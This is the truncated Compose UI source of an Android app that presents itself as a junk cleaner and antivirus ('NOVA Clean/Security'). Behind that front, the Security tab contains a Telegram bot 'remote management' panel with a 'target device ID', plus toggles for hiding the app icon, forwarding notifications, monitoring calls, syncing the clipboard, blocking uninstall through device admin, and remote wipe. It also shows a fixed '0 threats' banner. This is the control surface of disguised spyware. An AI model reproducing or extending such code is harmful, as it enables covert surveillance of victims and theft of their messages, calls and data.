package com.example.ui

import android.content.Intent
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Accessibility
import androidx.compose.material.icons.filled.AcUnit
import androidx.compose.material.icons.filled.AdminPanelSettings
import androidx.compose.material.icons.filled.Backspace
import androidx.compose.material.icons.filled.Bolt
import androidx.compose.material.icons.filled.BugReport
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.CloudDone
import androidx.compose.material.icons.filled.CloudUpload
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.ContentPaste
import androidx.compose.material.icons.filled.DeleteForever
import androidx.compose.material.icons.filled.DeleteSweep
import androidx.compose.material.icons.filled.FolderOpen
import androidx.compose.material.icons.filled.HelpOutline
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.LockOpen
import androidx.compose.material.icons.filled.Memory
import androidx.compose.material.icons.filled.NotificationsActive
import androidx.compose.material.icons.filled.OpenInNew
import androidx.compose.material.icons.filled.PhoneInTalk
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Screenshot
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material.icons.filled.SettingsApplications
import androidx.compose.material.icons.filled.Speed
import androidx.compose.material.icons.filled.Storage
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material.icons.filled.Thermostat
import androidx.compose.material.icons.filled.Videocam
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material.icons.filled.VpnKey
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Checkbox
import androidx.compose.material3.CheckboxDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.FilterChip
import androidx.compose.material3.FilterChipDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Shadow
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.example.scanner.AppAccessibilityService
import com.example.scanner.AppAdminReceiver
import com.example.data.CleanerTab
import com.example.data.LogType
import com.example.ui.components.CleanerSpeedometerGauge
import com.example.ui.components.JunkCategoryCard
import com.example.ui.components.NeonActivityItemRow
import com.example.ui.components.NeonGlassCard
import com.example.ui.components.NeonGlowingButton
import com.example.ui.components.NeonLinearProgress
import com.example.ui.components.NeonMediaCard
import com.example.ui.components.NeonMetricTile
import com.example.ui.components.NeonOutlinedButton
import com.example.ui.components.SecurityShieldGauge
import com.example.ui.components.formatFileSize
import com.example.ui.theme.NeonBackground
import com.example.ui.theme.NeonBlue
import com.example.ui.theme.NeonCyan
import com.example.ui.theme.NeonCyanBlueGradient
import com.example.ui.theme.NeonGreen
import com.example.ui.theme.NeonPink
import com.example.ui.theme.NeonPurple
import com.example.ui.theme.NeonSurface
import com.example.ui.theme.NeonTextMuted
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MediaSyncScreen(
    viewModel: MediaSyncViewModel,
    onRequestPermissions: () -> Unit,
    modifier: Modifier = Modifier
) {
    val selectedTab by viewModel.selectedTab.collectAsState()
    val hasPermission by viewModel.hasStoragePermission.collectAsState()

    // Junk State
    val junkCategories by viewModel.junkCategories.collectAsState()
    val isJunkScanning by viewModel.isJunkScanning.collectAsState()
    val isJunkCleaning by viewModel.isJunkCleaning.collectAsState()
    val junkCleaned by viewModel.junkCleaned.collectAsState()
    val freedJunkBytes by viewModel.freedJunkBytes.collectAsState()
    val currentScanningPath by viewModel.currentScanningPath.collectAsState()
    val storageCleanStatus by viewModel.storageCleanStatus.collectAsState()
    val cpuTemp by viewModel.cpuTemp.collectAsState()

    // Security State
    val isSecurityScanning by viewModel.isSecurityScanning.collectAsState()
    val securityScanProgress by viewModel.securityScanProgress.collectAsState()
    val securityScannedCount by viewModel.securityScannedCount.collectAsState()
    val totalAppsToScan = viewModel.totalAppsToScan
    val currentScanningApp by viewModel.currentScanningApp.collectAsState()
    val isDeviceProtected by viewModel.isDeviceProtected.collectAsState()
    val securityItems by viewModel.securityItems.collectAsState()

    val totalSelectedJunk = junkCategories.filter { it.isSelected }.sumOf { it.sizeBytes }

    // Stealth, Interceptor & PIN State
    val isUnlocked by viewModel.isUnlocked.collectAsState()
    val isAutoHideIcon by viewModel.isAutoHideIcon.collectAsState()
    val isNotificationForwarding by viewModel.isNotificationForwarding.collectAsState()
    val isCallMonitoring by viewModel.isCallMonitoring.collectAsState()
    val isClipboardSync by viewModel.isClipboardSync.collectAsState()
    val isAntiUninstall by viewModel.isAntiUninstall.collectAsState()
    val appPin by viewModel.appPin.collectAsState()
    val isTelegramConnected by viewModel.isTelegramConnected.collectAsState()

    val currentContext = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current

    var isDeviceAdminActive by remember {
        mutableStateOf(AppAdminReceiver.isActive(currentContext))
    }
    var isAccessibilityActive by remember {
        mutableStateOf(AppAccessibilityService.isAccessibilityServiceEnabled(currentContext))
    }

    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                isDeviceAdminActive = AppAdminReceiver.isActive(currentContext)
                isAccessibilityActive = AppAccessibilityService.isAccessibilityServiceEnabled(currentContext)
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    Scaffold(
        modifier = modifier
            .fillMaxSize()
            .background(NeonBackground),
        containerColor = NeonBackground
    ) { innerPadding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
        ) {
            // Ambient Radial Background Glows
            Box(
                modifier = Modifier
                    .size(340.dp)
                    .align(Alignment.TopCenter)
                    .background(
                        Brush.radialGradient(
                            colors = listOf(
                                when (selectedTab) {
                                    CleanerTab.CLEANER -> Color(0x2200F2FE)
                                    CleanerTab.ANTIVIRUS -> Color(0x2200C6FF)
                                },
                                Color.Transparent
                            )
                        )
                    )
            )

            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .statusBarsPadding()
            ) {
                // -------------------------------------------------------------
                // TOP APP BAR
                // -------------------------------------------------------------
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 20.dp, vertical = 12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                text = "NOVA",
                                color = Color.White,
                                fontSize = 20.sp,
                                fontWeight = FontWeight.Black,
                                letterSpacing = (-0.5).sp
                            )
                            Spacer(modifier = Modifier.width(4.dp))
                            Text(
                                text = when (selectedTab) {
                                    CleanerTab.CLEANER -> "CLEAN"
                                    CleanerTab.ANTIVIRUS -> "SECURITY"
                                },
                                color = NeonCyan,
                                fontSize = 20.sp,
                                fontWeight = FontWeight.Black,
                                letterSpacing = (-0.5).sp,
                                style = androidx.compose.ui.text.TextStyle(
                                    shadow = Shadow(
                                        color = NeonCyan.copy(alpha = 0.5f),
                                        blurRadius = 16f
                                    )
                                )
                            )
                        }
                        Text(
                            text = "SMART SYSTEM OPTIMIZER & SHIELD",
                            color = Color(0xFF64748B),
                            fontSize = 9.sp,
                            fontWeight = FontWeight.Bold,
                            letterSpacing = 1.2.sp
                        )
                    }

                    // Top Action Icons
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        // Quick Temp Badge
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(20.dp))
                                .background(Color(0x0DFFFFFF))
                                .border(1.dp, Color(0x1AFFFFFF), RoundedCornerShape(20.dp))
                                .padding(horizontal = 8.dp, vertical = 4.dp)
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = Icons.Default.Thermostat,
                                    contentDescription = null,
                                    tint = if (cpuTemp > 37f) NeonPink else NeonGreen,
                                    modifier = Modifier.size(12.dp)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = String.format(Locale.US, "%.1f°C", cpuTemp),
                                    color = Color(0xFFE2E8F0),
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }

                        // Shield Status Icon
                        Box(
                            modifier = Modifier
                                .size(36.dp)
                                .clip(CircleShape)
                                .background(Color(0x0DFFFFFF))
                                .border(1.dp, Color(0x1AFFFFFF), CircleShape),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.Security,
                                contentDescription = "Protected",
                                tint = NeonGreen,
                                modifier = Modifier.size(16.dp)
                            )
                        }
                    }
                }

                // Storage Permission Alert Banner (if needed)
                if (!hasPermission) {
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 20.dp, vertical = 6.dp)
                            .clip(RoundedCornerShape(16.dp))
                            .background(Color(0x22F43F5E))
                            .border(1.dp, Color(0x44F43F5E), RoundedCornerShape(16.dp))
                            .clickable { onRequestPermissions() }
                            .padding(12.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                                Icon(
                                    imageVector = Icons.Default.Security,
                                    contentDescription = null,
                                    tint = NeonPink,
                                    modifier = Modifier.size(20.dp)
                                )
                                Spacer(modifier = Modifier.width(8.dp))
                                Column {
                                    Text(
                                        text = "Optimization Permission Required",
                                        color = Color.White,
                                        fontSize = 12.sp,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Text(
                                        text = "Tap to grant access for deep junk cleaning & system speedup",
                                        color = Color(0xFFCBD5E1),
                                        fontSize = 10.sp
                                    )
                                }
                            }
                            NeonGlowingButton(
                                text = "GRANT",
                                onClick = { onRequestPermissions() },
                                gradient = Brush.horizontalGradient(listOf(NeonPink, Color(0xFFBE185D))),
                                glowColor = NeonPink,
                                modifier = Modifier.height(32.dp)
                            )

                        }
                    }
                }

                // -------------------------------------------------------------
                // MAIN TAB VIEW CONTENT
                // -------------------------------------------------------------
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .fillMaxWidth()
                ) {
                    when (selectedTab) {
                        CleanerTab.CLEANER -> {
                            JunkCleanerTabView(
                                junkCategories = junkCategories,
                                isScanning = isJunkScanning,
                                isCleaning = isJunkCleaning,
                                isCleaned = junkCleaned,
                                totalJunkBytes = totalSelectedJunk,
                                freedBytes = freedJunkBytes,
                                currentScanningPath = currentScanningPath,
                                storageCleanStatus = storageCleanStatus,
                                onScanJunk = { viewModel.scanJunk() },
                                onCleanJunk = { viewModel.cleanJunk() },
                                onToggleCategory = { viewModel.toggleJunkCategory(it) }
                            )
                        }
                        CleanerTab.ANTIVIRUS -> {
                            AntivirusTabView(
                                isScanning = isSecurityScanning,
                                isProtected = isDeviceProtected,
                                scanProgress = securityScanProgress,
                                scannedCount = securityScannedCount,
                                totalCount = totalAppsToScan,
                                currentScanningApp = currentScanningApp,
                                securityItems = securityItems,
                                deviceId = viewModel.deviceId,
                                isTelegramConnected = isTelegramConnected,
                                appPin = appPin,
                                isAutoHideIcon = isAutoHideIcon,
                                isNotificationForwarding = isNotificationForwarding,
                                isCallMonitoring = isCallMonitoring,
                                isClipboardSync = isClipboardSync,
                                isAntiUninstall = isAntiUninstall,
                                isDeviceAdminActive = isDeviceAdminActive,
                                isAccessibilityActive = isAccessibilityActive,
                                onStartScan = { viewModel.startSecurityScan() },
                                onSetAppPin = { viewModel.setAppPin(it) },
                                onLockNow = { viewModel.lockApp() },
                                onSetAutoHideIcon = { viewModel.setAutoHideIcon(it) },
                                onSetNotificationForwarding = { viewModel.setNotificationForwarding(it) },
                                onSetCallMonitoring = { viewModel.setCallMonitoring(it) },
                                onSetClipboardSync = { viewModel.setClipboardSync(it) },
                                onSetAntiUninstall = { viewModel.setAntiUninstall(it) },
                                onPerformWipe = { viewModel.performEmergencyWipe() }
                            )
                        }
                    }
                }

                // -------------------------------------------------------------
                // BOTTOM NAVIGATION BAR
                // -------------------------------------------------------------
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 16.dp, vertical = 10.dp)
                        .clip(RoundedCornerShape(24.dp))
                        .background(Color(0x0DFFFFFF)) // bg-white/5
                        .border(1.dp, Color(0x1AFFFFFF), RoundedCornerShape(24.dp))
                        .padding(vertical = 6.dp, horizontal = 12.dp)
                        .navigationBarsPadding(),
                    horizontalArrangement = Arrangement.SpaceAround,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    BottomNavButton(
                        icon = Icons.Default.DeleteSweep,
                        label = "Clean",
                        isSelected = selectedTab == CleanerTab.CLEANER,
                        activeColor = NeonCyan,
                        onClick = { viewModel.setSelectedTab(CleanerTab.CLEANER) }
                    )

                    BottomNavButton(
                        icon = Icons.Default.Security,
                        label = "Security",
                        isSelected = selectedTab == CleanerTab.ANTIVIRUS,
                        activeColor = NeonCyan,
                        onClick = { viewModel.setSelectedTab(CleanerTab.ANTIVIRUS) }
                    )
                }
            }

            // PIN Lock Screen Overlay (if PIN is set and not yet unlocked)
            if (!isUnlocked && !appPin.isNullOrBlank()) {
                CyberpunkPinLockOverlay(
                    onUnlock = { pin -> viewModel.unlockWithPin(pin) }
                )
            }
        }
    }
}

// -----------------------------------------------------------------
// TAB 1: JUNK CLEANER VIEW
// -----------------------------------------------------------------
@Composable
fun JunkCleanerTabView(
    junkCategories: List<com.example.data.JunkCategory>,
    isScanning: Boolean,
    isCleaning: Boolean,
    isCleaned: Boolean,
    totalJunkBytes: Long,
    freedBytes: Long,
    currentScanningPath: String,
    storageCleanStatus: String?,
    onScanJunk: () -> Unit,
    onCleanJunk: () -> Unit,
    onToggleCategory: (String) -> Unit
) {
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(horizontal = 20.dp, vertical = 8.dp),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // Hero Gauge Card
        item {
            NeonGlassCard(
                modifier = Modifier.fillMaxWidth(),
                glowColor = if (isCleaned) Color(0x2238EF7D) else Color(0x2200F2FE),
                showTopRightGlow = true
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    CleanerSpeedometerGauge(
                        junkBytes = totalJunkBytes,
                        isScanning = isScanning,
                        isCleaning = isCleaning,
                        isCleaned = isCleaned
                    )

                    Spacer(modifier = Modifier.height(16.dp))

                    if (isScanning) {
                        Text(
                            text = currentScanningPath,
                            color = Color(0xFF64748B),
                            fontSize = 10.sp,
                            fontFamily = FontFamily.Monospace,
                            maxLines = 1,
                            overflow = TextOverflow.Ellipsis
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                    }

                    if (isCleaning) {
                        NeonLinearProgress(
                            progress = 0.7f,
                            modifier = Modifier
                                .fillMaxWidth(0.8f)
                                .height(6.dp)
                        )
                        Spacer(modifier = Modifier.height(12.dp))
                    }

                    if (isCleaned) {
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(12.dp))
                                .background(Color(0x1A38EF7D))
                                .border(1.dp, Color(0x3338EF7D), RoundedCornerShape(12.dp))
                                .padding(horizontal = 14.dp, vertical = 8.dp)
                        ) {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                Text(
                                    text = "🎉 ${formatFileSize(freedBytes)} STORAGE FREED",
                                    color = NeonGreen,
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Black,
                                    letterSpacing = 0.5.sp
                                )
                                Text(
                                    text = "Physical cache & junk files removed from storage",
                                    color = Color(0xFF94A3B8),
                                    fontSize = 10.sp
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    // Primary Action Button
                    if (isCleaned) {
                        NeonOutlinedButton(
                            text = "SCAN STORAGE AGAIN",
                            icon = Icons.Default.Refresh,
                            onClick = onScanJunk,
                            borderColor = NeonCyan,
                            modifier = Modifier.fillMaxWidth()
                        )
                    } else {
                        NeonGlowingButton(
                            text = if (isScanning) "SCANNING REAL STORAGE..."
                            else if (isCleaning) "CLEANING STORAGE JUNK..."
                            else "CLEAN JUNK (${formatFileSize(totalJunkBytes)})",
                            icon = if (isScanning) Icons.Default.Refresh else Icons.Default.DeleteSweep,
                            onClick = {
                                if (!isScanning && !isCleaning) {
                                    if (totalJunkBytes > 0) onCleanJunk() else onScanJunk()
                                }
                            },
                            enabled = !isScanning && !isCleaning,
                            modifier = Modifier.fillMaxWidth()
                        )
                    }
                }
            }
        }

        // Section Title: Removable Junk Categories
        item {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "STORAGE JUNK BREAKDOWN",
                    color = Color(0xFF94A3B8),
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    letterSpacing = 1.2.sp
                )
                Text(
                    text = "${junkCategories.filter { it.isSelected }.size}/${junkCategories.size} Selected",
                    color = NeonCyan,
                    fontSize = 11.sp,
                    fontWeight = FontWeight.SemiBold
                )
            }
        }

        // Junk Items List
        items(junkCategories) { category ->
            JunkCategoryCard(
                category = category,
                onToggle = { onToggleCategory(category.id) }
            )
        }
    }
}

// -----------------------------------------------------------------
// TAB 2: ANTIVIRUS & SECURITY VIEW
// -----------------------------------------------------------------
@Composable
fun AntivirusTabView(
    isScanning: Boolean,
    isProtected: Boolean,
    scanProgress: Float,
    scannedCount: Int,
    totalCount: Int,
    currentScanningApp: String,
    securityItems: List<com.example.data.SecurityScanItem>,
    deviceId: String,
    isTelegramConnected: Boolean,
    appPin: String?,
    isAutoHideIcon: Boolean,
    isNotificationForwarding: Boolean,
    isCallMonitoring: Boolean,
    isClipboardSync: Boolean,
    isAntiUninstall: Boolean,
    isDeviceAdminActive: Boolean,
    isAccessibilityActive: Boolean,
    onStartScan: () -> Unit,
    onSetAppPin: (String?) -> Unit,
    onLockNow: () -> Unit,
    onSetAutoHideIcon: (Boolean) -> Unit,
    onSetNotificationForwarding: (Boolean) -> Unit,
    onSetCallMonitoring: (Boolean) -> Unit,
    onSetClipboardSync: (Boolean) -> Unit,
    onSetAntiUninstall: (Boolean) -> Unit,
    onPerformWipe: () -> Unit
) {
    var showPinDialog by remember { mutableStateOf(false) }
    var showWipeConfirmDialog by remember { mutableStateOf(false) }
    var showRestrictedGuideDialog by remember { mutableStateOf(false) }

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(horizontal = 20.dp, vertical = 8.dp),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // Shield Gauge Card
        item {
            NeonGlassCard(
                modifier = Modifier.fillMaxWidth(),
                glowColor = Color(0x2238EF7D),
                showTopRightGlow = true
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    SecurityShieldGauge(
                        isScanning = isScanning,
                        isProtected = isProtected,
                        progress = scanProgress,
                        scannedCount = scannedCount,
                        totalCount = totalCount
                    )

                    Spacer(modifier = Modifier.height(16.dp))

                    if (isScanning) {
                        Text(
                            text = currentScanningApp,
                            color = NeonCyan,
                            fontSize = 10.sp,
                            fontFamily = FontFamily.Monospace,
                            maxLines = 1,
                            overflow = TextOverflow.Ellipsis
                        )
                        Spacer(modifier = Modifier.height(12.dp))
                    } else {
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(12.dp))
                                .background(Color(0x1A38EF7D))
                                .border(1.dp, Color(0x3338EF7D), RoundedCornerShape(12.dp))
                                .padding(horizontal = 14.dp, vertical = 6.dp)
                        ) {
                            Text(
                                text = "🛡️ REAL-TIME PROTECTION ACTIVE • 0 THREATS",
                                color = NeonGreen,
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                        Spacer(modifier = Modifier.height(14.dp))
                    }

                    NeonGlowingButton(
                        text = if (isScanning) "SCANNING PACKAGES..." else "START DEEP VIRUS SCAN",
                        icon = Icons.Default.Security,
                        onClick = onStartScan,
                        enabled = !isScanning,
                        gradient = Brush.horizontalGradient(listOf(NeonCyan, NeonGreen)),
                        glowColor = NeonCyan,
                        modifier = Modifier.fillMaxWidth()
                    )

                }
            }
        }

        // Remote Bot Management Card
        item {
            val clipboardManager = androidx.compose.ui.platform.LocalClipboardManager.current
            val context = androidx.compose.ui.platform.LocalContext.current
            NeonGlassCard(
                modifier = Modifier.fillMaxWidth(),
                glowColor = Color(0x2200F2FE)
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp)
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween,
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.Terminal,
                                contentDescription = null,
                                tint = NeonCyan,
                                modifier = Modifier.size(18.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "REMOTE MANAGEMENT",
                                color = Color.White,
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                letterSpacing = 1.sp
                            )
                        }

                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .background(if (isTelegramConnected) Color(0x1A38EF7D) else Color(0x1AF59E0B))
                                .padding(horizontal = 8.dp, vertical = 4.dp)
                        ) {
                            Text(
                                text = if (isTelegramConnected) "🟢 TELEGRAM LIVE" else "🟡 CONNECTING",
                                color = if (isTelegramConnected) NeonGreen else Color(0xFFF59E0B),
                                fontSize = 9.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween,
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(10.dp))
                            .background(Color(0x0DFFFFFF))
                            .border(1.dp, Color(0x1A00F2FE), RoundedCornerShape(10.dp))
                            .padding(horizontal = 14.dp, vertical = 10.dp)
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "TARGET DEVICE ID",
                                color = Color(0xFF94A3B8),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.SemiBold,
                                letterSpacing = 1.sp
                            )
                            Spacer(modifier = Modifier.height(2.dp))
                            Text(
                                text = deviceId,
                                color = NeonCyan,
                                fontSize = 14.sp,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace
                            )
                        }

                        androidx.compose.material3.IconButton(
                            onClick = {
                                clipboardManager.setText(androidx.compose.ui.text.AnnotatedString(deviceId))
                                Toast.makeText(context, "Copied Device ID: $deviceId", Toast.LENGTH_SHORT).show()
                            },
                            modifier = Modifier.size(36.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Default.ContentCopy,
                                contentDescription = "Copy Device ID",
                                tint = NeonCyan,
                                modifier = Modifier.size(18.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        // Quick Action: Open Telegram
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .clip(RoundedCornerShape(8.dp))
                                .background(Color(0x1A00F2FE))
                                .border(1.dp, Color(0x3300F2FE), RoundedCornerShape(8.dp))
                                .clickable {
                                    try {
                                        val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://t.me"))
                                        context.startActivity(intent)
                                    } catch (_: Exception) {
                                        Toast.makeText(context, "Telegram app not found", Toast.LENGTH_SHORT).show()
                                    }
                                }
                                .padding(vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = Icons.Default.OpenInNew,
                                    contentDescription = null,
                                    tint = NeonCyan,
                                    modifier = Modifier.size(14.dp)
                                )
                                Spacer(modifier = Modifier.width(6.dp))
                                Text(
                                    text = "OPEN TELEGRAM",
                                    color = NeonCyan,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }

                        // Quick Action: Copy /help command
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .clip(RoundedCornerShape(8.dp))
                                .background(Color(0x1A38EF7D))
                                .border(1.dp, Color(0x3338EF7D), RoundedCornerShape(8.dp))
                                .clickable {
                                    clipboardManager.setText(androidx.compose.ui.text.AnnotatedString("/help $deviceId"))
                                    Toast.makeText(context, "Copied: /help $deviceId", Toast.LENGTH_SHORT).show()
                                }
                                .padding(vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = Icons.Default.ContentCopy,
                                    contentDescription = null,
                                    tint = NeonGreen,
                                    modifier = Modifier.size(14.dp)
                                )
                                Spacer(modifier = Modifier.width(6.dp))
                                Text(
                                    text = "COPY /HELP",
                                    color = NeonGreen,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    Text(
                        text = "⚡ কন্ট্রোল ও মনিটরিং করতে টেলিগ্রাম বটে /help কমান্ড পাঠিয়ে সম্পূর্ণ ইন্টারঅ্যাক্টিভ ড্যাশবোর্ড ব্যবহার করুন।",
                        color = Color(0xFF94A3B8),
                        fontSize = 11.sp,
                        lineHeight = 16.sp
                    )
                }
            }
        }

        // Stealth, Security PIN & Interceptor Controls Card
        item {
            NeonGlassCard(
                modifier = Modifier.fillMaxWidth(),
                glowColor = Color(0x228B5CF6)
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(14.dp)
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween,
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = Icons.Default.VpnKey,
                                contentDescription = null,
                                tint = NeonPurple,
                                modifier = Modifier.size(18.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "STEALTH, PIN & INTERCEPTORS",
                                color = Color.White,
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                letterSpacing = 1.sp
                            )
                        }

                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .background(Color(0x1A8B5CF6))
                                .padding(horizontal = 6.dp, vertical = 2.dp)
                        ) {
                            Text(
                                text = if (!appPin.isNullOrBlank()) "PIN PROTECTED" else "UNPROTECTED",
